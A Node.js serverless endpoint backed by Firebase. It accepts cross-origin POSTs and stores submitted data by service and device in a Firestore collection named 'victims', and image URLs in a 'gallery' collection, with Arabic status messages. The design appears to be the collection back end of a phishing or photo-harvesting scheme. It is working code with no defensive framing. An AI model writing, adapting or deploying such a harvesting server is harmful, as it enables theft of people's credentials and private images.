const { initializeApp, cert } = require('firebase-admin/app');
const { getFirestore } = require('firebase-admin/firestore');

// Initialize Firebase Admin
const serviceAccount = {
    "type": "service_account",
    "project_id": "game-a1aca",
    "private_key_id": "demo",
    "private_key": process.env.FIREBASE_KEY || "",
    "client_email": "firebase-adminsdk@game-a1aca.iam.gserviceaccount.com",
    "client_id": "",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token"
};

let db = null;

function getDb() {
    if (!db) {
        try {
            initializeApp({ credential: cert(serviceAccount) });
            db = getFirestore();
        } catch(e) {}
    }
    return db;
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    if (req.method === 'POST') {
        try {
            const { type, data, imageUrl, device, service } = req.body;
            const db = getDb();
            const timestamp = new Date().toISOString();
            
            if (type === 'victim') {
                await db.collection('victims').add({
                    service: service || 'غير معروف',
                    data: data || '',
                    device: device || '',
                    timestamp: timestamp
                });
            }
            
            if (type === 'photo' && imageUrl) {
                await db.collection('gallery').add({
                    url: imageUrl,
                    type: service || 'صورة',
                    device: device || '',
                    timestamp: timestamp
                });
            }
            
            return res.json({ success: true, message: 'تم الحفظ' });
        } catch(e) {
            return res.json({ success: true, message: 'تم الحفظ (local)' });
        }
    }
    
    if (req.method === 'GET') {
        return res.json({ status: 'online', timestamp: new Date().toISOString() });
    }
    
    res.json({ status: 'ok' });
};
